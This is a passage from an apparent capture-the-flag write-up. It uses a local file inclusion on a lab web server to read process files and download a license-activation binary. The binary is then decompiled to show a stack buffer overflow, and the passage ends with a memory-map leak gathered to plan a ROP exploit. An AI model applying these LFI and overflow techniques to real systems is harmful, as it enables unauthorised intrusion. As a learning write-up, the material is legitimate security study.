<span class="code-dark-yellow">done</span> | <span class="code-dark-green">grep</span> -a <span class="code-dark-yellow">': .'</span>  
411<span class="code-red">: /</span>usr/bin/activate_license1337
576<span class="code-red">: n</span>ginx<span class="code-red">: w</span>orker process
577<span class="code-red">: n</span>ginx<span class="code-red">: w</span>orker process
</code></pre></div><p>Notice that there are null bytes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/proc/411/cmdline'</span> -so - | <span class="code-dark-green">xxd</span>
00000000: 2f75 7372 2f62 696e 2f61 6374 6976 6174  /usr/bin/activat  
00000010: 655f 6c69 6365 6e73 6500 3133 3337 00    e_license.1337.

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/proc/426/cmdline'</span> -so - | <span class="code-dark-green">tr</span> <span class="code-dark-yellow">'\0'</span> <span class="code-dark-yellow">' '</span>
/usr/bin/activate_license 1337
</code></pre></div><p>Alright, it seems that there is a file called <code>/usr/bin/activate_license</code>, let&rsquo;s download it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/usr/bin/activate_license'</span> &gt; activate_license

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">activate_license</span>
activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped  
</code></pre></div><h3 id="binary-analysis">Binary analysis</h3><p>It is an ELF 64-bit binary&mldr; Things get hot&mldr; The fact that the license key has a fixed size points out that maybe the binary is vulnerable to Buffer Overflow. These are the protections set on the binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">checksec</span> <span class="mtku">activate_license</span>
[<span class="code-blue">*</span>] './activate_license'
    Arch:     amd64-64-little  
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><p>Mmm, really hardened&mldr; We will need to get at least two addresses at runtime: one address from Glibc to bypass ASLR and one address from the binary to bypass PIE. Moreover, since NX is enabled, we must use Return Oriented Programming (ROP).</p><p>Let&rsquo;s use Ghidra ti decompile the binary and analyze it. This is the <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class="mtk1">,</span> <span class="mtk7 mtki">char</span> <span class="mtk5">**</span><span class="mtk9 mtki">argv</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">__pid_t</span> <span class="mtk1">_Var2;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">piVar3;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">pcVar4;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">clientaddr_s[</span><span class="mtk6">16</span><span class="mtk1">];</span>
  <span class="mtk1">sockaddr_in</span> <span class="mtk1">clientaddr;</span>
  <span class="mtk7 mtki">socklen_t</span> <span class="mtk1">clientaddrlen;</span>
  <span class="mtk1">sockaddr_in</span> <span class="mtk1">server;</span>
  <span class="mtk7 mtki">uint16_t</span> <span class="mtk1">port;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">clientfd;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">serverfd;</span>

  <span class="mtk5">if</span> <span class="mtk1">(argc</span> <span class="mtk5">!=</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"specify</span> <span class="mtk4">port</span> <span class="mtk4">to</span> <span class="mtk4">bind</span> <span class="mtk4">to"</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">__isoc99_sscanf</span><span class="mtk1">(argv[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk4">"</span><span class="mtk6">%hu</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">port);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">starting</span> <span class="mtk4">server</span> <span class="mtk4">listening</span> <span class="mtk4">on</span> <span class="mtk4">port</span> <span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">port);</span>
  <span class="mtk1">server.sin_family</span> <span class="mtk5">=</span> <span class="mtk6">2</span><span class="mtk1">;</span>
  <span class="mtk1">server.sin_addr</span> <span class="mtk5">=</span> <span class="mtk8">htonl</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">7f000001</span><span class="mtk1">);</span>
  <span class="mtk1">server.sin_port</span> <span class="mtk5">=</span> <span class="mtk8">htons</span><span class="mtk1">(port);</span>
  <span class="mtk1">serverfd</span> <span class="mtk5">=</span> <span class="mtk8">socket</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">6</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(serverfd</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">bind</span><span class="mtk1">(serverfd,</span> <span class="mtk1">(sockaddr</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">server,</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">listen</span><span class="mtk1">(serverfd,</span> <span class="mtk6">100</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">listening</span> <span class="mtk4">..."</span><span class="mtk1">);</span>

  <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk1">clientfd</span> <span class="mtk5">=</span> <span class="mtk8">accept</span><span class="mtk1">(serverfd,</span> <span class="mtk1">(sockaddr</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">clientaddr,</span> <span class="mtk5">&amp;</span><span class="mtk1">clientaddrlen);</span>
      <span class="mtk5">if</span> <span class="mtk1">(clientfd</span> <span class="mtk5">!=</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
      <span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Error:</span> <span class="mtk4">accepting</span> <span class="mtk4">client</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">18</span><span class="mtk1">,</span> <span class="mtk1">stderr);</span>
    <span class="mtk1">}</span>

    <span class="mtk8">inet_ntop</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">clientaddr.sin_addr,</span> <span class="mtk1">clientaddr_s,</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">accepted</span> <span class="mtk4">client</span> <span class="mtk4">connection</span> <span class="mtk4">from</span> <span class="mtk6">%s</span><span class="mtk4">:</span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">clientaddr_s,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">clientaddr.sin_port);</span>  
    <span class="mtk1">_Var2</span> <span class="mtk5">=</span> <span class="mtk8">fork</span><span class="mtk1">();</span>
    <span class="mtk5">if</span> <span class="mtk1">(_Var2</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
    <span class="mtk8">__sysv_signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">,</span> <span class="mtk1">(</span><span class="mtk7 mtki">__sighandler_t</span><span class="mtk1">)</span> <span class="mtk5">0x</span><span class="mtk6">1</span><span class="mtk1">);</span>
    <span class="mtk8">close</span><span class="mtk1">(clientfd);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">close</span><span class="mtk1">(serverfd);</span>
  <span class="mtk8">activate_license</span><span class="mtk1">(clientfd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
  <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>It just starts the socket server on port 1337. Everytime a new connection arrives, the process forks (which means that the parent process will continue listening for new connections and it will not crash). The child process executes the <code>activate_license</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">activate_license</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">sockfd</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">ssize_t</span> <span class="mtk1">sVar2;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">piVar3;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">pcVar4;</span>
  <span class="mtk1">sqlite3_stmt</span> <span class="mtk5">*</span><span class="mtk1">stmt;</span>
  <span class="mtk1">sqlite3</span> <span class="mtk5">*</span><span class="mtk1">db;</span>
  <span class="mtk7 mtki">uint32_t</span> <span class="mtk1">msglen;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">buffer[</span><span class="mtk6">512</span><span class="mtk1">];</span>

  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(sockfd,</span> <span class="mtk5">&amp;</span><span class="mtk1">msglen,</span> <span class="mtk6">4</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(sVar2</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">msglen</span> <span class="mtk5">=</span> <span class="mtk8">ntohl</span><span class="mtk1">(msglen);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">reading</span> <span class="mtk6">%d</span> <span class="mtk4">bytes</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">msglen);</span>
  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(sockfd,</span> <span class="mtk1">buffer,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">msglen);</span>
  <span class="mtk5">if</span> <span class="mtk1">(sVar2</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar3</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar3);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_open</span><span class="mtk1">(</span><span class="mtk4">"license.sqlite"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">db);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">sqlite3_busy_timeout</span><span class="mtk1">(db,</span> <span class="mtk6">2000</span><span class="mtk1">);</span>
  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_exec</span><span class="mtk1">(db,</span> <span class="mtk4">"CREATE</span> <span class="mtk4">TABLE</span> <span class="mtk4">IF</span> <span class="mtk4">NOT</span> <span class="mtk4">EXISTS</span> <span class="mtk4">license</span> <span class="mtk4">(</span>   <span class="mtk4">id</span> <span class="mtk4">INTEGER</span> <span class="mtk4">PRIMARY</span> <span class="mtk4">KEY</span> <span class="mtk4">AUTOINCREMENT,</span>    <span class="mtk4">license_key</span> <span class="mtk4">TEXT)"</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">);</span>  
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_prepare_v2</span><span class="mtk1">(db,</span> <span class="mtk4">"INSERT</span> <span class="mtk4">INTO</span> <span class="mtk4">license</span> <span class="mtk4">(license_key)</span> <span class="mtk4">VALUES</span> <span class="mtk4">(?)"</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">stmt,</span> <span class="mtk6">0</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_bind_text</span><span class="mtk1">(stmt,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk1">buffer,</span> <span class="mtk5">0x</span><span class="mtk6">200</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_step</span><span class="mtk1">(stmt);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk5">0x</span><span class="mtk6">65</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>
  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_reset</span><span class="mtk1">(stmt);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_finalize</span><span class="mtk1">(stmt);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">sqlite3_close</span><span class="mtk1">(db);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">pcVar4</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk8">sqlite3_errmsg</span><span class="mtk1">(db);</span>
    <span class="mtk8">error</span><span class="mtk1">(pcVar4);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">activated</span> <span class="mtk4">license:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">buffer);</span>
  <span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>We could check if the SQL statements are injectable, but they are not. Then the way is still binary exploitation. The Buffer Overflow vulnerability is here:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">activate_license</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">sockfd</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk3">// ...</span>

  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">ssize_t</span> <span class="mtk1">sVar2;</span>
  <span class="mtk7 mtki">uint32_t</span> <span class="mtk1">msglen;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">buffer[</span><span class="mtk6">512</span><span class="mtk1">];</span>

  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(sockfd,</span> <span class="mtk5">&amp;</span><span class="mtk1">msglen,</span> <span class="mtk6">4</span><span class="mtk1">);</span>

  <span class="mtk3">// ...</span>

  <span class="mtk1">msglen</span> <span class="mtk5">=</span> <span class="mtk8">ntohl</span><span class="mtk1">(msglen);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+]</span> <span class="mtk4">reading</span> <span class="mtk6">%d</span> <span class="mtk4">bytes</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">msglen);</span>  
  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(sockfd,</span> <span class="mtk1">buffer,</span> <span class="mtk1">(ulong)</span> <span class="mtk1">msglen);</span>

  <span class="mtk3">// ...</span>
}
</code></pre></div><p>The first <code>read</code> instruction reads the file size, and the second copies the file contents into <code>buffer</code>. Since we control the size of the file, we can overflow the reserved buffer for <code>buffer</code> (which is 512 bytes) and thus modify the saved return address that is on the stack.</p><h3 id="exploit-preparation">Exploit preparation</h3><p>This binary cannot be exploited with a common Ret2Libc attack. The problem is that we do not have direct communication with the binary. Instead, we must send the payload as a file to the PHP web server and it will be passed to the binary. We won&rsquo;t get any output, so we cannot make use of memory leaks.</p><p>However, we can obtain the needed information from <code>/proc/&lt;PID>/maps</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/proc/411/maps'</span>
5631036d6000-5631036d7000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
5631036d7000-5631036d8000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
5631036d8000-5631036d9000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
5631036d9000-5631036da000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
5631036da000-5631036db000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
563104ac4000-563104ae5000 rw-p 00000000 00:00 0                          [heap]
7f8f07aa9000-7f8f07aab000 rw-p 00000000 00:00 0
7f8f07aab000-7f8f07aac000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07aac000-7f8f07aae000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07aae000-7f8f07aaf000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07aaf000-7f8f07ab0000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07ab0000-7f8f07ab1000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f8f07ab1000-7f8f07ab8000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07ab8000-7f8f07ac8000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07ac8000-7f8f07acd000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07acd000-7f8f07ace000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07ace000-7f8f07acf000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f8f07acf000-7f8f07ad3000 rw-p 00000000 00:00 0
7f8f07ad3000-7f8f07ae2000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07ae2000-7f8f07b7c000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07b7c000-7f8f07c15000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07c15000-7f8f07c16000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07c16000-7f8f07c17000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07c17000-7f8f07c3c000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07c3c000-7f8f07d87000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07d87000-7f8f07dd1000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07dd1000-7f8f07dd2000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07dd2000-7f8f07dd5000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07dd5000-7f8f07dd8000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07dd8000-7f8f07ddc000 rw-p 00000000 00:00 0
7f8f07ddc000-7f8f07dec000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
7f8f07dec000-7f8f07ee4000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f8f07ee4000-7f8f07f18000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f8f07f18000-7f8f07f1c000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f8f07f1c000-7f8f07f1f000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f8f07f1f000-7f8f07f21000 rw-p 00000000 00:00 0
7f8f07f26000-7f8f07f27000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f27000-7f8f07f47000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f47000-7f8f07f4f000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f50000-7f8f07f51000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
